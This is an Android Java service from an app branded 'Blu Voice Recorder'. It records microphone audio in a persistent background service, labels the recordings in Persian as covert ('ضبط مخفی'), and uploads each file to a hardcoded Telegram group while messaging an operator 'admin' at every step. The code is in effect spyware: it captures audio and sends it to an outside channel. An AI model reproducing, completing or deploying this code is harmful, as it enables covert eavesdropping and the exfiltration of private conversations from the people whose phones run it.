package com.blu.app.voice;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.blu.app.database.AppDatabase;
import com.blu.app.database.VoiceRecord;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class VoiceRecorderService extends Service {
    private static final String TAG = "VoiceRecorderService";
    private static final String CHANNEL_ID = "voice_recording_channel";
    private static final int NOTIFICATION_ID = 9001;
    
    private VoiceRecorderManager recorderManager;
    private AppDatabase database;
    private int currentRecordId = -1;
    private TelegramUploader uploader;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🚀 Service created");
        createNotificationChannel();
        database = AppDatabase.getInstance(this);
        recorderManager = new VoiceRecorderManager(this);
        uploader = new TelegramUploader();
        
        // ✅ ارسال پیام تست به گروه
        uploader.sendMessageToGroup("🚀 سرویس ضبط صدا راه‌اندازی شد!");
        uploader.sendMessageToAdmin("🚀 سرویس ضبط صدا راه‌اندازی شد!");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        
        String action = intent.getAction();
        Log.d(TAG, "📨 Action: " + action);
        
        if ("START_RECORDING".equals(action)) {
            startRecording();
        } else if ("STOP_RECORDING".equals(action)) {
            stopRecording();
        }
        
        return START_STICKY;
    }
    
    private void startRecording() {
        Log.d(TAG, "🎤 Starting recording...");
        
        // ✅ ارسال پیام به گروه
        uploader.sendMessageToGroup("🔴 ضبط صدا شروع شد!");
        uploader.sendMessageToAdmin("🎤 ضبط صدا شروع شد!");
        
        sendBroadcast(new Intent("VOICE_RECORDING_STARTED"));
        
        recorderManager.setRecordingListener(new VoiceRecorderManager.RecordingListener() {
            @Override
            public void onRecordingStarted(String filePath, long startTime) {
                Log.d(TAG, "✅ Recording started: " + filePath);
                saveVoiceRecord(filePath, startTime);
                updateNotification("🎤 در حال ضبط...");
                uploader.sendMessageToAdmin("✅ ضبط شروع شد: " + filePath);
            }
            
            @Override
            public void onRecordingCompleted(String filePath, long duration) {
                Log.d(TAG, "⏹️ Recording completed");
                updateNotification("📤 در حال ارسال...");
                
                sendBroadcast(new Intent("VOICE_RECORDING_COMPLETED"));
                uploader.sendMessageToAdmin("⏹️ ضبط کامل شد، مدت: " + (duration/1000) + " ثانیه");
                
                new Thread(() -> {
                    try {
                        VoiceRecord record = database.voiceRecordDao().getVoiceRecord(currentRecordId);
                        if (record != null) {
                            record.status = "RECORDED";
                            record.endTime = System.currentTimeMillis();
                            record.duration = duration;
                            database.voiceRecordDao().updateVoiceRecord(record);
                            
                            // ✅ آپلود به گروه
                            boolean success = uploader.uploadAudio(filePath, record.caption);
                            
                            if (success) {
                                record.status = "UPLOADED";
                                database.voiceRecordDao().updateVoiceRecord(record);
                                updateNotification("✅ ارسال شد!");
                                sendBroadcast(new Intent("VOICE_UPLOAD_SUCCESS"));
                                uploader.sendMessageToGroup("✅ فایل صوتی با موفقیت ارسال شد!");
                            } else {
                                record.status = "FAILED";
                                database.voiceRecordDao().updateVoiceRecord(record);
                                updateNotification("❌ ارسال ناموفق");
                                sendBroadcast(new Intent("VOICE_UPLOAD_FAILED"));
                                uploader.sendMessageToGroup("❌ ارسال فایل صوتی ناموفق بود!");
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error", e);
                        uploader.sendMessageToAdmin("❌ خطا: " + e.getMessage());
                    }
                }).start();
            }
            
            @Override
            public void onRecordingError(String error) {
                Log.e(TAG, "❌ Recording error: " + error);
                updateNotification("❌ خطا: " + error);
                uploader.sendMessageToAdmin("❌ خطا در ضبط: " + error);
            }
        });
        
        recorderManager.startRecording();
        startForeground(NOTIFICATION_ID, createNotification("🎤 در حال ضبط مخفی..."));
    }
    
    private void stopRecording() {
        Log.d(TAG, "⏹️ Stopping recording");
        recorderManager.stopRecording();
        uploader.sendMessageToAdmin("⏹️ ضبط متوقف شد");
    }
    
    private void saveVoiceRecord(String filePath, long startTime) {
        new Thread(() -> {
            VoiceRecord record = new VoiceRecord();
            record.filePath = filePath;
            record.startTime = startTime;
            record.botToken = TelegramUploader.class.getSimpleName();
            record.chatId = "-1004352035353";
            record.status = "RECORDING";
            record.uploadAttempts = 0;
            record.createdAt = System.currentTimeMillis();
            String date = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.US).format(new Date(startTime));
            record.caption = "🎙️ ضبط مخفی: " + date;
            long id = database.voiceRecordDao().insertVoiceRecord(record);
            currentRecordId = (int) id;
            Log.d(TAG, "💾 Record saved with ID: " + id);
        }).start();
    }
    
    private Notification createNotification(String text) {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("🎙️ Blu Voice Recorder")
            .setContentText(text)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .build();
    }
    
    private void updateNotification(String text) {
        NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (manager != null) {
            manager.notify(NOTIFICATION_ID, createNotification(text));
        }
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, 
                "Voice Recording", 
                NotificationManager.IMPORTANCE_HIGH
            );
            channel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "💀 Service destroyed");
        if (recorderManager != null) {
            recorderManager.stopRecording();
        }
        uploader.sendMessageToAdmin("💀 سرویس متوقف شد");
    }
    
    @Override
    public IBinder onBind(Intent intent) { 
        return null; 
    }
}
